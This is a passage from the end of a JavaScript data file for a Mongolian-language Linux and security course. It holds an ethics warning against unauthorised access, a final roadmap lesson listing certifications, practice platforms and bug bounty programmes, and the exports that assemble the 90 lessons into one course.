      { type: 'warn', text: 'Зөвшөөрөлгүй нэвтрэх, өгөгдөл хулгайлах, гэмтээх нь гэмт хэрэг бөгөөд карьер, эрх чөлөөг тань эрсдэлд оруулна.' },
    ],
  },
  {
    id: 'a30', title: 'Цааш юу сурах — замын зураг', level: 'Ахлах шат',
    summary: 'Мэргэшил, сертификат, дараагийн алхам.',
    blocks: [
      { type: 'p', text: 'Та Linux үндэснээс эхлээд аюулгүй байдлын дэвшилтэт ойлголт хүртэл судаллаа. Цаашид:' },
      { type: 'list', items: [
        'Сертификат: eJPT → OSCP → OSEP',
        'Чиглэл: Web, Network, Cloud, Red Team, Malware',
        'Дадлага: HackTheBox, TryHackMe тогтмол',
        'Програмчлал: Python, Bash, Go гүнзгийрүүлэх',
        'Нийгэмлэг: bug bounty (HackerOne, Bugcrowd)',
      ] },
      { type: 'note', text: 'Тогтмол дадлага, ёс зүй, сониуч зан — энэ гурав л мэргэжлийн өсөлтийн түлхүүр. Амжилт хүсье!' },
    ],
  },
];

/* ============================================================
   Нэг "Linux" курс — дотроо 3 түвшнээр (90 хичээл)
   ============================================================ */
export const LINUX_COURSE = {
  id: 'linux',
  name: 'Linux үндэс',
  tagline: 'Анхан · Дунд · Ахлах · 90 хичээл',
  lessons: [...ANHAN, ...DUND, ...AHLAH],
};

// (хуучин нэрээр ашиглаж байгаа газруудтай нийцүүлэх)
export const LEVEL_COURSES = [LINUX_COURSE];

export default LINUX_COURSE;
